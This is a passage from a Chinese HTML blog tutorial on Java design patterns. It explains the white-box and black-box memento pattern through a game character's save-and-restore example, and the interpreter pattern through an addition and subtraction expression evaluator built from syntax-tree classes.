<span class="keyword">int</span> <span class="title">getAtk</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> atk;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">setAtk</span><span class="params">(<span class="keyword">int</span> atk)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.atk = atk;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">getDef</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> def;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">setDef</span><span class="params">(<span class="keyword">int</span> def)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.def = def;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//角色状态管理者类</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">RoleStateCaretaker</span> </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> RoleStateMemento roleStateMemento;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> RoleStateMemento <span class="title">getRoleStateMemento</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> roleStateMemento;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">setRoleStateMemento</span><span class="params">(RoleStateMemento roleStateMemento)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.roleStateMemento = roleStateMemento;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//测试类</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Client</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;------------大战Boss前------------&quot;</span>);</span><br><span class="line">        <span class="comment">//大战Boss前</span></span><br><span class="line">        GameRole gameRole = <span class="keyword">new</span> GameRole();</span><br><span class="line">        gameRole.initState();</span><br><span class="line">        gameRole.stateDisplay();</span><br><span class="line"></span><br><span class="line">        <span class="comment">//保存进度</span></span><br><span class="line">        RoleStateCaretaker roleStateCaretaker = <span class="keyword">new</span> RoleStateCaretaker();</span><br><span class="line">        roleStateCaretaker.setRoleStateMemento(gameRole.saveState());</span><br><span class="line"></span><br><span class="line">        System.out.println(<span class="string">&quot;------------大战Boss后------------&quot;</span>);</span><br><span class="line">        <span class="comment">//大战Boss时，损耗严重</span></span><br><span class="line">        gameRole.fight();</span><br><span class="line">        gameRole.stateDisplay();</span><br><span class="line">        System.out.println(<span class="string">&quot;------------恢复之前状态------------&quot;</span>);</span><br><span class="line">        <span class="comment">//恢复之前状态</span></span><br><span class="line">        gameRole.recoverState(roleStateCaretaker.getRoleStateMemento());</span><br><span class="line">        gameRole.stateDisplay();</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<blockquote>
<p>分析：<strong>白箱备忘录模式是破坏封装性</strong>的。但是通过程序员自律，同样可以在一定程度上实现模式的大部分用意。</p>
</blockquote>
<h5 id="“黑箱”备忘录模式"><a href="#“黑箱”备忘录模式" class="headerlink" title="“黑箱”备忘录模式"></a>“黑箱”备忘录模式</h5><p>备忘录角色对发起人对象提供一个宽接口，而为其他对象提供一个窄接口。在Java语言中，实现双重接口的办法就是将<strong>备忘录类</strong>设计成<strong>发起人类</strong>的成员内部类。</p>
<p>将 <code>RoleStateMemento</code> 设为 <code>GameRole</code> 的内部类，从而将 <code>RoleStateMemento</code> 对象封装在 <code>GameRole</code> 里面；在外面提供一个标识接口 <code>Memento</code> 给 <code>RoleStateCaretaker</code> 及其他对象使用。这样 <code>GameRole</code> 类看到的是 <code>RoleStateMemento</code> 所有的接口，而<code>RoleStateCaretaker</code>  及其他对象看到的仅仅是标识接口 <code>Memento</code> 所暴露出来的接口，从而维护了封装型。类图如下：</p>
<img src="https://raw.githubusercontent.com/liu-ruyang/MyPicturesReposity/main/img/2024/2024-11-26-16-44-39.png" style="zoom:70%;" />

<p>代码如下：</p>
<p>窄接口<code>Memento</code>，这是一个标识接口，因此没有定义出任何的方法</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">interface</span> <span class="title">Memento</span> </span>&#123;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>定义发起人类 <code>GameRole</code>，并在内部定义备忘录内部类 <code>RoleStateMemento</code>（该内部类设置为私有的）</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">/游戏角色类</span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">GameRole</span> </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">int</span> vit; <span class="comment">//生命力</span></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">int</span> atk; <span class="comment">//攻击力</span></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">int</span> def; <span class="comment">//防御力</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">//初始化状态</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">initState</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.vit = <span class="number">100</span>;</span><br><span class="line">        <span class="keyword">this</span>.atk = <span class="number">100</span>;</span><br><span class="line">        <span class="keyword">this</span>.def = <span class="number">100</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//战斗</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">fight</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.vit = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">this</span>.atk = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">this</span>.def = <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//保存角色状态</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> Memento <span class="title">saveState</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">new</span> RoleStateMemento(vit, atk, def);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//回复角色状态</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">recoverState</span><span class="params">(Memento memento)</span> </span>&#123;</span><br><span class="line">        RoleStateMemento roleStateMemento = (RoleStateMemento) memento;</span><br><span class="line">        <span class="keyword">this</span>.vit = roleStateMemento.getVit();</span><br><span class="line">        <span class="keyword">this</span>.atk = roleStateMemento.getAtk();</span><br><span class="line">        <span class="keyword">this</span>.def = roleStateMemento.getDef();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">stateDisplay</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;角色生命力：&quot;</span> + vit);</span><br><span class="line">        System.out.println(<span class="string">&quot;角色攻击力：&quot;</span> + atk);</span><br><span class="line">        System.out.println(<span class="string">&quot;角色防御力：&quot;</span> + def);</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">getVit</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> vit;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">setVit</span><span class="params">(<span class="keyword">int</span> vit)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.vit = vit;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">getAtk</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> atk;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">setAtk</span><span class="params">(<span class="keyword">int</span> atk)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.atk = atk;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">getDef</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> def;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">setDef</span><span class="params">(<span class="keyword">int</span> def)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.def = def;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="class"><span class="keyword">class</span> <span class="title">RoleStateMemento</span> <span class="keyword">implements</span> <span class="title">Memento</span> </span>&#123;</span><br><span class="line">        <span class="keyword">private</span> <span class="keyword">int</span> vit;</span><br><span class="line">        <span class="keyword">private</span> <span class="keyword">int</span> atk;</span><br><span class="line">        <span class="keyword">private</span> <span class="keyword">int</span> def;</span><br><span class="line"></span><br><span class="line">        <span class="function"><span class="keyword">public</span> <span class="title">RoleStateMemento</span><span class="params">(<span class="keyword">int</span> vit, <span class="keyword">int</span> atk, <span class="keyword">int</span> def)</span> </span>&#123;</span><br><span class="line">            <span class="keyword">this</span>.vit = vit;</span><br><span class="line">            <span class="keyword">this</span>.atk = atk;</span><br><span class="line">            <span class="keyword">this</span>.def = def;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">getVit</span><span class="params">()</span> </span>&#123;</span><br><span class="line">            <span class="keyword">return</span> vit;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">setVit</span><span class="params">(<span class="keyword">int</span> vit)</span> </span>&#123;</span><br><span class="line">            <span class="keyword">this</span>.vit = vit;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">getAtk</span><span class="params">()</span> </span>&#123;</span><br><span class="line">            <span class="keyword">return</span> atk;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">setAtk</span><span class="params">(<span class="keyword">int</span> atk)</span> </span>&#123;</span><br><span class="line">            <span class="keyword">this</span>.atk = atk;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">getDef</span><span class="params">()</span> </span>&#123;</span><br><span class="line">            <span class="keyword">return</span> def;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">setDef</span><span class="params">(<span class="keyword">int</span> def)</span> </span>&#123;</span><br><span class="line">            <span class="keyword">this</span>.def = def;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><strong>负责人角色类 <code>RoleStateCaretaker</code> 能够得到的备忘录对象是以 <code>Memento</code> 为接口的，由于这个接口仅仅是一个标识接口，因此负责人角色不可能改变这个备忘录对象的内容</strong></p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">//角色状态管理者类</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">RoleStateCaretaker</span> </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> Memento memento;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> Memento <span class="title">getMemento</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> memento;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">setMemento</span><span class="params">(Memento memento)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.memento = memento;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>客户端测试类</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Client</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;------------大战Boss前------------&quot;</span>);</span><br><span class="line">        <span class="comment">//大战Boss前</span></span><br><span class="line">        GameRole gameRole = <span class="keyword">new</span> GameRole();</span><br><span class="line">        gameRole.initState();</span><br><span class="line">        gameRole.stateDisplay();</span><br><span class="line"></span><br><span class="line">        <span class="comment">//保存进度</span></span><br><span class="line">        RoleStateCaretaker roleStateCaretaker = <span class="keyword">new</span> RoleStateCaretaker();</span><br><span class="line">        roleStateCaretaker.setMemento(gameRole.saveState());</span><br><span class="line">        </span><br><span class="line">        System.out.println(<span class="string">&quot;------------大战Boss后------------&quot;</span>);</span><br><span class="line">        <span class="comment">//大战Boss时，损耗严重</span></span><br><span class="line">        gameRole.fight();</span><br><span class="line">        gameRole.stateDisplay();</span><br><span class="line">        System.out.println(<span class="string">&quot;------------恢复之前状态------------&quot;</span>);</span><br><span class="line">        <span class="comment">//恢复之前状态</span></span><br><span class="line">        gameRole.recoverState(roleStateCaretaker.getMemento());</span><br><span class="line">        gameRole.stateDisplay();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>



<h5 id="优缺点-3"><a href="#优缺点-3" class="headerlink" title="优缺点"></a>优缺点</h5><ul>
<li><p><strong>优点：</strong></p>
<ul>
<li><p>提供了一种可以恢复状态的机制。当用户需要时能够比较方便地将数据恢复到某个历史的状态。</p>
</li>
<li><p>实现了内部状态的封装。除了创建它的发起人之外，其他对象都不能够访问这些状态信息（<strong>指的“黑箱备忘录模式”</strong>）。</p>
</li>
<li><p>简化了发起人类。发起人不需要管理和保存其内部状态的各个备份，所有状态信息都保存在备忘录中，并由管理者进行管理，这符合单一职责原则。</p>
</li>
</ul>
</li>
</ul>
<ul>
<li><strong>缺点：</strong><ul>
<li>资源消耗大。如果要保存的内部状态信息过多或者特别频繁，将会占用比较大的内存资源。</li>
</ul>
</li>
</ul>
<h5 id="使用场景-6"><a href="#使用场景-6" class="headerlink" title="使用场景"></a>使用场景</h5><ul>
<li><p>需要保存与恢复数据的场景，如玩游戏时的中间结果的存档功能。</p>
</li>
<li><p>需要提供一个可回滚操作的场景，如 Word、记事本、Photoshop，idea等软件在编辑时按 Ctrl+Z 组合键，还有数据库中事务操作。</p>
</li>
</ul>
<h4 id="解释器模式"><a href="#解释器模式" class="headerlink" title="解释器模式"></a>解释器模式</h4><p><strong>概述</strong></p>
<img src="https://raw.githubusercontent.com/liu-ruyang/MyPicturesReposity/main/img/2024/2024-11-27-17-31-39.png" style="zoom:60%;" />

<p>如上图，设计一个软件用来进行加减计算。我们第一想法就是使用工具类，提供对应的加法和减法的工具方法。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">//用于两个整数相加</span></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">int</span> <span class="title">add</span><span class="params">(<span class="keyword">int</span> a,<span class="keyword">int</span> b)</span></span>&#123;</span><br><span class="line">    <span class="keyword">return</span> a + b;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//用于两个整数相加</span></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">int</span> <span class="title">add</span><span class="params">(<span class="keyword">int</span> a,<span class="keyword">int</span> b,<span class="keyword">int</span> c)</span></span>&#123;</span><br><span class="line">    <span class="keyword">return</span> a + b + c;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//用于n个整数相加</span></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">int</span> <span class="title">add</span><span class="params">(Integer ... arr)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">int</span> sum = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span> (Integer i : arr) &#123;</span><br><span class="line">        sum += i;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> sum;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>上面的形式比较单一、有限，如果形式变化非常多，这就不符合要求，因为加法和减法运算，两个运算符与数值可以有无限种组合方式。比如 1+2+3+4+5、1+2+3-4等等。   </p>
<p>显然，现在需要一种翻译识别机器，能够解析由数字以及 + - 符号构成的合法的运算序列。如果把运算符和数字都看作节点的话，能够逐个节点的进行读取解析运算，这就是解释器模式的思维。</p>
<p><strong>定义：</strong></p>
<blockquote>
<p>给定一个语言，定义它的文法表示，并定义一个解释器，这个解释器使用该标识来解释语言中的句子。</p>
</blockquote>
<p>在解释器模式中，我们需要将待解决的问题，提取出规则，抽象为一种“语言”。比如加减法运算，规则为：由数值和+-符号组成的合法序列，“1+3-2” 就是这种语言的句子。</p>
<p>解释器就是要解析出来语句的含义。但是如何描述规则呢？</p>
<p><strong>文法（语法）规则：</strong></p>
<p>文法是用于描述语言的语法结构的形式规则。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">expression ::&#x3D; value | plus | minus</span><br><span class="line">plus ::&#x3D; expression ‘+’ expression   </span><br><span class="line">minus ::&#x3D; expression ‘-’ expression  </span><br><span class="line">value ::&#x3D; integer</span><br></pre></td></tr></table></figure>

<blockquote>
<p>注意： 这里的符号“::=”表示“定义为”的意思，竖线 | 表示或，左右的其中一个，引号内为字符本身，引号外为语法。</p>
</blockquote>
<p>上面规则描述为 ：</p>
<p>表达式可以是一个值，也可以是plus或者minus运算，而plus和minus又是由表达式结合运算符构成，值的类型为整型数。</p>
<p><strong>抽象语法树：</strong></p>
<p>在计算机科学中，抽象语法树（AbstractSyntaxTree，AST），或简称语法树（Syntax tree），是源代码语法结构的一种抽象表示。它以树状的形式表现编程语言的语法结构，树上的每个节点都表示源代码中的一种结构。</p>
<p>用树形来表示符合文法规则的句子。</p>
<img src="https://raw.githubusercontent.com/liu-ruyang/MyPicturesReposity/main/img/2024/2024-11-27-17-31-11.png" style="zoom:50%;" />

<h5 id="结构-4"><a href="#结构-4" class="headerlink" title="结构"></a>结构</h5><p>解释器模式包含以下主要角色。</p>
<ul>
<li><p>抽象表达式（Abstract Expression）角色：定义解释器的接口，约定解释器的解释操作，主要包含解释方法 interpret()。</p>
</li>
<li><p>终结符表达式（Terminal  Expression）角色：是抽象表达式的子类，用来实现文法中与终结符相关的操作，文法中的每一个终结符都有一个具体终结表达式与之相对应。</p>
</li>
<li><p>非终结符表达式（Nonterminal Expression）角色：也是抽象表达式的子类，用来实现文法中与非终结符相关的操作，文法中的每条规则都对应于一个非终结符表达式。</p>
</li>
<li><p>环境（Context）角色：通常包含各个解释器需要的数据或是公共的功能，一般用来传递被所有解释器共享的数据，后面的解释器可以从这里获取这些值。</p>
</li>
<li><p>客户端（Client）：主要任务是将需要分析的句子或表达式转换成使用解释器对象描述的抽象语法树，然后调用解释器的解释方法，当然也可以通过环境角色间接访问解释器的解释方法。</p>
</li>
</ul>
<h5 id="案例实现-9"><a href="#案例实现-9" class="headerlink" title="案例实现"></a>案例实现</h5><p>【例】设计实现加减法的软件</p>
<img src="https://raw.githubusercontent.com/liu-ruyang/MyPicturesReposity/main/img/2024/2024-11-27-17-35-38.png" style="zoom:70%;" />

<p>代码如下：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 抽象角色AbstractExpression</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">abstract</span> <span class="class"><span class="keyword">class</span> <span class="title">AbstractExpression</span> </span>&#123;</span><br><span class="line">    <span class="comment">// 计算出表达式结果</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">abstract</span> <span class="keyword">int</span> <span class="title">interpret</span><span class="params">(Context context)</span></span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 终结符表达式角色</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Value</span> <span class="keyword">extends</span> <span class="title">AbstractExpression</span> </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">int</span> value;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">Value</span><span class="params">(<span class="keyword">int</span> value)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.value = value;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">interpret</span><span class="params">(Context context)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> value;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">toString</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">new</span> Integer(value).toString();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 非终结符表达式角色  加法表达式</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Plus</span> <span class="keyword">extends</span> <span class="title">AbstractExpression</span> </span>&#123;</span><br><span class="line">    <span class="comment">// +号左边的表达式</span></span><br><span class="line">    <span class="keyword">private</span> AbstractExpression left;</span><br><span class="line">    <span class="comment">// +号右边的表达式</span></span><br><span class="line">    <span class="keyword">private</span> AbstractExpression right;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">Plus</span><span class="params">(AbstractExpression left, AbstractExpression right)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.left = left;</span><br><span class="line">        <span class="keyword">this</span>.right = right;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">interpret</span><span class="params">(Context context)</span> </span>&#123;</span><br><span class="line">        <span class="comment">// 将左边表达式的结果和右边表达式的结果进行相加</span></span><br><span class="line">        <span class="keyword">return</span> left.interpret(context) + right.interpret(context);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">toString</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;(&quot;</span> + left.toString() + <span class="string">&quot; + &quot;</span> + right.toString() + <span class="string">&quot;)&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 非终结符表达式角色 减法表达式</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Minus</span> <span class="keyword">extends</span> <span class="title">AbstractExpression</span> </span>&#123;</span><br><span class="line">    <span class="comment">// -号左边的表达式</span></span><br><span class="line">    <span class="keyword">private</span> AbstractExpression left;</span><br><span class="line">    <span class="comment">// -号右边的表达式</span></span><br><span class="line">    <span class="keyword">private</span> AbstractExpression right;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">Minus</span><span class="params">(AbstractExpression left, AbstractExpression right)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.left = left;</span><br><span class="line">        <span class="keyword">this</span>.right = right;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">interpret</span><span class="params">(Context context)</span> </span>&#123;</span><br><span class="line">        <span class="comment">// 将左边表达式的结果和右边表达式的结果进行相减</span></span><br><span class="line">        <span class="keyword">return</span> left.interpret(context) - right.interpret(context);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">toString</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;(&quot;</span> + left.toString() + <span class="string">&quot; - &quot;</span> + right.toString() + <span class="string">&quot;)&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 终结符表达式角色 变量表达式</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Variable</span> <span class="keyword">extends</span> <span class="title">AbstractExpression</span> </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> String name;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">Variable</span><span class="params">(String name)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.name = name;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">interpret</span><span class="params">(Context ctx)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> ctx.getValue(<span class="keyword">this</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">toString</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> name;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 环境类</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Context</span> </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> Map&lt;Variable, Integer&gt; map = <span class="keyword">new</span> HashMap&lt;Variable, Integer&gt;();</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">assign</span><span class="params">(Variable <span class="keyword">var</span>, Integer value)</span> </span>&#123;</span><br><span class="line">        map.put(<span class="keyword">var</span>, value);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">getValue</span><span class="params">(Variable <span class="keyword">var</span>)</span> </span>&#123;</span><br><span class="line">        Integer value = map.get(<span class="keyword">var</span>);</span><br><span class="line">        <span class="keyword">return</span> value;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 测试类</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Client</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">        Context context = <span class="keyword">new</span> Context();</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 创建多个变量对象</span></span><br><span class="line">        Variable a = <span class="keyword">new</span> Variable(<span class="string">&quot;a&quot;</span>);</span><br><span class="line">        Variable b = <span class="keyword">new</span> Variable(<span class="string">&quot;b&quot;</span>);</span><br><span class="line">        Variable c = <span class="keyword">new</span> Variable(<span class="string">&quot;c&quot;</span>);</span><br><span class="line">        Variable d = <span class="keyword">new</span> Variable(<span class="string">&quot;d&quot;</span>);</span><br><span class="line">        Variable e = <span class="keyword">new</span> Variable(<span class="string">&quot;e&quot;</span>);</span><br><span class="line">        <span class="comment">//Value v = new Value(1);</span></span><br><span class="line">		</span><br><span class="line">        <span class="comment">// 将变量存储到环境对象中</span></span><br><span class="line">        context.assign(a, <span class="number">1</span>);	<span class="comment">// 这里的1就是充当Value对象的作用，直接写1是为方便</span></span><br><span class="line">        context.assign(b, <span class="number">2</span>);</span><br><span class="line">        context.assign(c, <span class="number">3</span>);</span><br><span class="line">        context.assign(d, <span class="number">4</span>);</span><br><span class="line">        context.assign(e, <span class="number">5</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 获取抽象语法树	a + b + c + d - e</span></span><br><span class="line">        AbstractExpression expression = <span class="keyword">new</span> Minus(<span class="keyword">new</span> Plus(<span class="keyword">new</span> Plus(<span class="keyword">new</span> Plus(a, b), c), d), e);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 解释（计算）</span></span><br><span class="line">        System.out.println(expression + <span class="string">&quot;= &quot;</span> + expression.interpret(context));</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<h5 id="优缺点-4"><a href="#优缺点-4" class="headerlink" title="优缺点"></a>优缺点</h5><ul>
<li><p><strong>优点：</strong></p>
<ul>
